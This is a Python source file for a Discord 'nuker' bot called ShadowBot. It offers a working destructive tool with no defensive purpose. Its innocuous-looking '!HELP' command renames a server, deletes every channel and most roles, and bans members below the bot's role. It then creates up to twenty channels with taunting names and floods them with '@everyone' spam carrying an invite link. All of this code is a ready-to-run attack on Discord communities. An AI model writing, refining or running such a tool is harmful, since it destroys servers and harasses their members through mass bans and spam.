import discord
from discord import app_commands
from discord.ext import commands
import random
from colorama import Fore, Style, init
import asyncio
import aiohttp
import time
from typing import Optional, Set, Dict

# Initialize colorama for cross-platform support
init(autoreset=True)

# --- CONFIGURATION ---
TOKEN = ""  # Replace with actual token or use env vars
OWNER_IDS = {12345637890123456789}  # REPLACE WITH YOUR DISCORD USER ID
SPAM_CHANNEL_NAMES = [
    "shadow-runs-you", "get-banned", "nuked", "oops-fucked-by-shadow", 
    "f-in-chat-shadow", "should-have-listened", "get-nuked-clowns", 
    "nuked-by-shadow", "oops-got-nuked", "i-run-you", "kinda-got-nuked",
    "shadow-is-here", "eternal-darkness", "ruled-by-shadow"
]
DEFAULT_MSG = "@everyone You Got Nuked by [SHADOW](https://discord.gg/7vNQSZsfKW) RIP [67](https://cdn.discordapp.com/attachments/1482724625141207091/1482760368198516911/lv_0_20260315201458.gif)"

# Global State
blacklisted_users: Set[int] = set()
blacklisted_servers: Set[int] = set()
webhook_url = "" 
MESSAGES_PER_CHANNEL = 5
CHANNEL_CREATION_LIMIT = 20

class ShadowBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.all()
        super().__init__(command_prefix="!", intents=intents, help_command=None)

    async def setup_hook(self):
        # Syncing slash commands
        await self.tree.sync()
        print(f"{Fore.YELLOW}[SYSTEM] Commands Synced Globally")

client = ShadowBot()

# --- UTILS ---

def is_owner():
    async def predicate(ctx):
        return ctx.author.id in OWNER_IDS
    return commands.check(predicate)

async def check_permissions(ctx):
    """Unified check for blacklists."""
    if ctx.guild and ctx.guild.id in blacklisted_servers:
        await ctx.send("❌ This server is blacklisted from using the bot.", delete_after=5)
        return False
    if ctx.author.id in blacklisted_users:
        await ctx.send("❌ You cannot use this command because you are blacklisted on the bot.", delete_after=5)
        return False
    return True

async def fast_delete(target):
    try:
        await target.delete()
    except:
        pass

async def fast_ban(guild, member):
    try:
        await guild.ban(member, reason="SHADOW RUNS YOU")
    except:
        pass

async def channel_spam_logic(channel, message_content):
    try:
        tasks = [channel.send(message_content) for _ in range(MESSAGES_PER_CHANNEL)]
        await asyncio.gather(*tasks, return_exceptions=True)
    except:
        pass

# --- SLASH COMMANDS (OWNER ONLY) ---

@client.tree.command(name="x-blacklist-server", description="Blacklist a server from using the bot (Owner Only)")
@app_commands.describe(server_id="The ID of the server to blacklist")
async def blacklist_server_slash(interaction: discord.Interaction, server_id: str):
    if interaction.user.id not in OWNER_IDS:
        return await interaction.response.send_message("❌ You do not have permission to use this command.", ephemeral=True)
    
    try:
        s_id = int(server_id)
        blacklisted_servers.add(s_id)
        await interaction.response.send_message(f"🚫 Server `{s_id}` has been blacklisted.", ephemeral=True)
    except ValueError:
        await interaction.response.send_message("❌ Invalid Server ID.", ephemeral=True)

@client.tree.command(name="x-blacklist-user", description="Blacklist a user from using the bot (Owner Only)")
@app_commands.describe(user_id="The ID of the user to blacklist")
async def blacklist_user_slash(interaction: discord.Interaction, user_id: str):
    if interaction.user.id not in OWNER_IDS:
        return await interaction.response.send_message("❌ You do not have permission to use this command.", ephemeral=True)
    
    try:
        u_id = int(user_id)
        blacklisted_users.add(u_id)
        await interaction.response.send_message(f"👤 User `{u_id}` has been blacklisted.", ephemeral=True)
    except ValueError:
        await interaction.response.send_message("❌ Invalid User ID.", ephemeral=True)

# --- PREFIX COMMANDS ---

@client.event
async def on_ready():
    print(f"\n{Fore.CYAN}╔════════════════════════════════════════════╗")
    print(f"{Fore.CYAN}║ {Fore.WHITE}Logged in as: {client.user.name.ljust(25)} {Fore.CYAN}║")
    print(f"{Fore.CYAN}║ {Fore.WHITE}ID: {str(client.user.id).ljust(33)} {Fore.CYAN}║")
    print(f"{Fore.CYAN}║ {Fore.MAGENTA}SHADOW ENGINE LOADED - SERVER LIMITS REMOVED {Fore.CYAN}║")
    print(f"{Fore.CYAN}╚════════════════════════════════════════════╝{Fore.RESET}\n")
    await client.change_presence(activity=discord.Streaming(name="!HELP for Chaos", url="https://twitch.tv/discord"))

@client.command()
@commands.cooldown(1, 30, commands.BucketType.user)
async def HELP(ctx, name: str = "NUKED BY SHADOW", *, msg: str = DEFAULT_MSG):
    # Blacklist Check
    if not await check_permissions(ctx):
        ctx.command.reset_cooldown(ctx)
        return

    guild = ctx.guild
    try: await ctx.message.delete()
    except: pass

    print(f"{Fore.RED}[!] EXECUTION STARTED: {guild.name}{Fore.RESET}")

    # 1. Update Server Identity
    try: await guild.edit(name=name)
    except: pass

    # 2. Parallel Deletion
    deletion_tasks = []
    for channel in guild.channels:
        deletion_tasks.append(fast_delete(channel))
    
    for role in guild.roles:
        if role < guild.me.top_role and not role.is_default() and not role.managed:
            deletion_tasks.append(fast_delete(role))

    # 3. Parallel Ban tasks
    for member in guild.members:
        if member.id != ctx.author.id and member.id != client.user.id:
            if member.top_role < guild.me.top_role:
                asyncio.create_task(fast_ban(guild, member))

    await asyncio.gather(*deletion_tasks, return_exceptions=True)

    # 4. Reformation (Limited to 20 channels)
    async def create_and_flood():
        try:
            channel_name = random.choice(SPAM_CHANNEL_NAMES)
            new_channel = await guild.create_text_channel(channel_name)
            asyncio.create_task(channel_spam_logic(new_channel, msg))
        except:
            pass

    creation_tasks = [create_and_flood() for _ in range(CHANNEL_CREATION_LIMIT)]
    await asyncio.gather(*creation_tasks, return_exceptions=True)
    
    print(f"{Fore.YELLOW}[*] Execution Finished in {guild.name}{Fore.RESET}")

@HELP.error
async def help_error(ctx, error):
    if isinstance(error, commands.CommandOnCooldown):
        await ctx.send(f"Wait {error.retry_after:.2f} seconds materializing chaos...", delete_after=5)

@client.command()
async def ping(ctx):
    if not await check_permissions(ctx): return
    await ctx.send(f"Latency: {round(client.latency * 1000)}ms")

# --- EXECUTION ---
try:
    client.run(TOKEN)
except discord.LoginFailure:
    print(f"{Fore.RED}[ERROR] Invalid Token Provided.{Fore.RESET}")
except Exception as e:
    print(f"{Fore.RED}[ERROR] Fatal: {e}{Fore.RESET}")